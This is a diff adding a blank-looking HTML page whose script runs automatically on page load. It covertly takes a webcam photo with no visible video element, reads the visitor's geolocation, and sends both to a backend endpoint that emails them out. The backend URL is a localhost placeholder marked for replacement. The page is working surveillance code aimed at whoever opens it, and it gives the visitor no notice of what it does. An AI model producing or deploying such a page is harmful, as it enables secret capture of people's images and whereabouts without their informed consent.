@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture & Send</title>
+</head>
+<body>
+
+    <script>
+        // 📷 Access the camera without adding a video element
+        async function captureAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                
+                // Capture image
+                const blob = await imageCapture.takePhoto();
+                track.stop(); // Stop the camera after capturing
+
+                // Convert to Base64
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = async () => {
+                    const imageBase64 = reader.result;
+
+                    // Get location
+                    const location = await getLocation();
+
+                    // Send to backend
+                    fetch("http://localhost:3000/send-email", {  // Replace with your backend URL
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ image: imageBase64, location })
+                    })
+                    .then(response => response.json())  
+                    .then(data => console.log("Email sent:", data))
+                    .catch(error => console.error("Error sending email:", error));
+                };
+            } catch (error) {
+                console.error("Error capturing image:", error);
+            }
+        }
+
+        // 🌍 Get user's location
+        async function getLocation() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        console.log(position);
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    () => resolve({ latitude: "Unknown", longitude: "Unknown" })
+                );
+            });
+        }
+
+        // 🔥 Start everything automatically when page loads
+        window.onload = captureAndSend;
+    </script>
+
+</body>
+</html>
